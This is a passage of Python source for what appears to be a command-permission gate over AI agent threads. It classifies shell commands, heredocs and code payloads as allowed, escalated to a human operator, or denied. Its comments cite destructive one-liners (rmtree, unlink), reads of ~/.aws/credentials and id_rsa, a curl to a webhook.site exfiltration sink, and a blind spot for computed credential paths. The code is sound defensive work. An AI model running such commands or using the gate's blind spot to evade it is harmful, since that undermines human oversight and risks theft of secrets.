    # (`python3 -c "import shutil; shutil.rmtree(...)"` splits at the `;`),
    # shredding the very token that needs judging.
    inert = _inert_positions(tokens)
    verbs = sorted(_verb_positions(tokens))
    env = sc.flat() if sc else None
    for i, tok in enumerate(tokens):
        if tok in SHELL_OPERATORS or i in inert:
            continue
        prev = tokens[i - 1] if i else ""
        is_code = prev in CODE_OPTS or prev in CODE_VERBS
        # A code payload is judged whatever its shape: a space-free one-liner
        # (`perl -e "unlink(glob('/x'))"`) is as executable as a spaced one.
        if not is_code and not WS_IN_TOKEN.search(tok):
            continue
        if is_code and depth < MAX_WRAP_DEPTH:
            verb = os.path.basename(tokens[max([v for v in verbs if v < i], default=0)])
            shell = prev in CODE_VERBS or verb in shellwords.SHELLS
            d, why = decide_auto(tok, root, cwd, _depth=depth + 1, extra_roots=extra_roots,
                                 _env=env, _code=not shell, _subs=sc.subs if sc else None)
            if d != "allow-auto":
                return d, f"wrapped code ({prev}): {why}"
        if is_code:
            # The recursion above re-tokenizes; this reads the payload as text,
            # because that is the only way a path inside a function call is
            # seen as a path. Absolute and ~ forms only - a computed path
            # (open(os.environ["HOME"] + "/.aws/credentials")) is still beyond
            # anything that reads text rather than watching behaviour, and this
            # is not sold as more than it is.
            for m in EMBEDDED_PATH_RE.finditer(tok):
                # The payload's own quotes are not shell quotes: no braces or
                # globs, but the outer shell did expand its variables.
                w = Word(m.group(1), m.group(1), expands=False, bare_var=False)
                v = _judge_path(m.group(1), root, root, extra_roots, w, sc, i)
                if v:
                    return v[0], f"path in code payload ({prev}): {v[1]}"
        # A search/program operand opens nothing and executes nothing:
        # `grep -rn "rm -rf" .` is a read. roles() has classified this token
        # since the PATTERN role was added; this scan simply never asked, and
        # once an escalate became a block for threads with no operator behind
        # the gate, not asking meant refusing ordinary lookups. Substitution
        # bearing tokens are still judged - by position a pattern, in fact a
        # command.
        if i in patterns and not SUBST_RE.search(tok):
            continue
        m = QUOTED_DENY_RE.search(tok)
        if m:
            return "escalate", f"quoted argument contains {m.group(0)!r}"
    return None


def _payload_verdict(verb: str, contents: str, quoted: bool, root: Path, cwd, depth: int,
                     extra_roots: tuple[str, ...], env: dict) -> tuple[str, str] | None:
    """A heredoc an interpreter reads is code, not data. A shell's is judged
    as the command it is; anyone else's the way a -c payload is - its quoted
    paths, and deny-class content in its multi-word strings."""
    if verb in shellwords.SHELLS:
        d, why = decide_auto(contents, root, cwd, _depth=depth + 1, extra_roots=extra_roots, _env=env)
        return (d, f"heredoc run by {verb}: {why}") if d != "allow-auto" else None
    # Only what a path IS, not where it sits: a heredoc program is long, and a
    # string like '/opus2/' or '/f' in it is a fragment far more often than a
    # file. Before this rule nothing in a heredoc program was judged at all.
    for m in EMBEDDED_PATH_RE.finditer(contents):
        w = Word(m.group(1), m.group(1), expands=False, bare_var=False, literal=quoted)
        paths, _ = _shell_paths(w, root, shellwords.Scope(outer=env))
        for p in paths:
            v = sensitive_verdict(p, root)
            if v:
                return v[0], f"path in heredoc run by {verb}: {v[1]}"
    for tok in _tokens(contents):
        m = QUOTED_DENY_RE.search(tok) if WS_IN_TOKEN.search(tok) else None
        if m:
            return "escalate", f"heredoc run by {verb} contains {m.group(0)!r}"
    return None


def decide_auto(command: str, root: Path, cwd: Path | str | None = None, _depth: int = 0,
                extra_roots: tuple[str, ...] = (), _env: dict | None = None,
                _code: bool = False, _subs: dict | None = None) -> tuple[str, str]:
    """`root` is the repo boundary; `cwd` is where relative paths resolve from.

    They default to the same thing, which is how this behaved before - and why
    a thread running in games/pinball-lab had `ls ../e4/` resolved to /Users/e4
    and escalated as "outside repo" when it is inside it.

    `extra_roots` widens CONTAINMENT ONLY, for a thread whose declared `dir` is
    another repo: muse2 runs in /Users/pup/muse, so without it every single
    command it ran there escalated ("path outside repo: harness-morning/...")
    and the thread sat on a permission dialog until the prompt went stale.
    Delete rules are deliberately not widened - `rm` inside a watched project
    still escalates.
    """
    delete_why = _delete_denied(command, root)
    if delete_why:
        return "deny", delete_why
    for rx, why in DENY:
        if rx.search(command):
            return "deny", why
    for rx, why in ESCALATE:
        if rx.search(command):
            return "escalate", why
    # `_code`: this is a python/node/... payload, re-read as shell text only to
    # find paths in it. Its own quoting is not shell quoting and the outer
    # shell has already done every expansion it was going to.
    if _depth == 0:
        shellwords.begin_decision()
    subs = dict(_subs or {})
    if _code:
        text, bodies, payloads = command, [], []
    else:
        scanned = shellwords.scan(command)
        text, bodies, payloads = scanned.text, scanned.bodies, scanned.payloads
        subs.update(scanned.subs)
    if (bodies or payloads) and _depth >= MAX_WRAP_DEPTH:
        return "escalate", "command substitution or heredoc nested too deep to judge"
    tokens = _tokens(text)
    words = None if _code else shellwords.split(text)
    if words is None or len(words) != len(tokens):
        words = shellwords.words_for(tokens)
        if _code:
            words = [dataclasses.replace(w, literal=True) for w in words]
    else:
        tokens = [w.text for w in words]   # the same split, with $'\x2f' decoded as the shell does
    sc = shellwords.scope(words, _depth, _env, str(cwd or root), subs)
    env = sc.flat()
    # A substitution runs wherever it sits - inside a quoted argument, a
    # commit message, a path - so its body is judged as the command it is.
    # Before the wrapped scan, so a credential read inside one is a deny and
    # not a keyword escalation.
    for body in bodies:
        d, why = decide_auto(body, root, cwd, _depth=_depth + 1, extra_roots=extra_roots, _env=env)
        if d != "allow-auto":
            return d, f"command substitution: {why}"
    for verb, contents, quoted in payloads:
        v = _payload_verdict(verb, contents, quoted, root, cwd, _depth, extra_roots, env)
        if v:
            return v
    wrapped = _wrapped_verdict(text, root, _depth, cwd, extra_roots, sc)
    if wrapped:
        return wrapped
    # One pass, not two. _loopback_url and _path_ok judge disjoint token
    # classes - _is_path_candidate rejects URLs outright, and a path is never a
    # URL - so merging cannot change which reason a given token produces. It
    # only reports whichever offending token comes first when a command has
    # both, and either way the verdict is escalate.
    bases = _token_bases(tokens, Path(cwd) if cwd else root, words, sc)
    inert = _inert_positions(tokens)
    for i, (tok, role) in enumerate(zip(tokens, roles(tokens))):
        if role is URL:
            # A known sink is denied outright rather than escalated: there is
            # no version of "curl https://webhook.site/..." from a fleet thread
            # that an operator should be asked to approve at 3am.
            sink = exfil_host(tok)
            if sink:
                return "deny", f"known exfil sink ({sink}): {tok}"
            return "escalate", f"non-loopback URL: {tok}"
        if role is OTHER and bases[i] == UNKNOWN_BASE and tok and not tok.startswith("-") \
                and not WS_IN_TOKEN.search(tok):
            # After a cd the gate could not follow, a bare `id_rsa` could be anything.
            return "escalate", f"relative word after a cd the gate cannot follow: {tok}"
        if role is not PATH:
            continue  # VERB or PATTERN: not a file this command reads or writes
        if i in inert and "\x00" in tok:
            # A commit message or packet body built by $(...): its body was
            # judged above as the command it is; its output is text, not a path.
            continue
        verdict = _judge_path(tok, root, bases[i], extra_roots, words[i], sc, i)
        if verdict:
            return verdict
    return "allow-auto", "in-repo, no deny match"


def _dir(profile: str) -> Path:
    d = profile_state(profile) / "prompts"
    d.mkdir(parents=True, exist_ok=True)
    return d


def open_prompt(thread: str, tool: str, command: str, cwd: str, profile: str) -> Path:
    pid = packet_mod.new_id()
    path = _dir(profile) / f"{thread}-{pid}.json"
    path.write_text(json.dumps({"id": pid, "thread": thread, "tool": tool, "command": command, "cwd": cwd, "t": time.time()}))
    return path


# hooks/v2/perm.sh gives wait_decision 300 s, and wait_decision unlinks the
# file in a `finally`. So a record still on disk older than that means its
# waiter died abnormally: nothing is blocked on it, `fleet decide` cannot
# release it (there is no listener), and it sits in the dashboard forever
# claiming a thread needs an answer. Found live with a 47-hour-old orphan
# alongside two fresh ones. Same failure and same remedy as hold.sh's STALE_S
# for pending replies - "the waiter died without clearing it" is a known mode
# in this system, not a hypothetical. Doubled to 600 s so a slow-but-live
# waiter is never reaped out from under itself.
STALE_PROMPT_S = 600


def pending(profile: str, now: float | None = None) -> list[dict]:
    """Undecided prompts awaiting an operator, reaping orphans as it goes.

    Deliberately side-effecting: leaving orphans costs a queue that only grows
    and a dashboard that lies about what is blocked, and every caller of this
    function wants the true list. `status.resolve_pending` sets the precedent
    for a read that repairs what it reads.
    """
    now = time.time() if now is None else now
    out = []
    for p in sorted(_dir(profile).glob("*.json")):
        try:
            rec = json.loads(p.read_text())
        except (FileNotFoundError, json.JSONDecodeError):
            continue
        if now - rec.get("t", 0) > STALE_PROMPT_S:
            p.unlink(missing_ok=True)  # orphan, decided or not: no waiter remains
            continue
        if "decision" not in rec:
            out.append(rec)
    return out


def record_decision(thread: str, pid: str, decision: str, profile: str) -> Path:
    """Stamp the decision onto the prompt file atomically.

    wait_decision polls this file from another process. A plain write_text
    truncates first, so that poll could read an empty (or half-written) file
    exactly when the answer arrives - json.JSONDecodeError, treated as "still
    undecided", and on a tight deadline that is a lost `allow`. Write a
    sibling .tmp and os.replace it in, the same trick registry.save uses.
    """
    path = _dir(profile) / f"{thread}-{pid}.json"
    rec = json.loads(path.read_text())
    rec["decision"] = decision; rec["decided_t"] = time.time()
    tmp = path.with_name(path.name + ".tmp")
    tmp.write_text(json.dumps(rec))
    os.replace(tmp, path)
    return path


def wait_decision(path: Path, timeout: float, sleep=time.sleep) -> str | None:
    deadline = time.monotonic() + timeout
    try:
        while True:
            try:
                rec = json.loads(path.read_text())
            except (FileNotFoundError, json.JSONDecodeError):
                rec = {}
            if rec.get("decision") in ("allow", "deny"):
                return rec["decision"]
            if time.monotonic() >= deadline:
                return None
            sleep(0.5)
    finally:
        try:
            path.unlink()
        except FileNotFoundError:
            pass
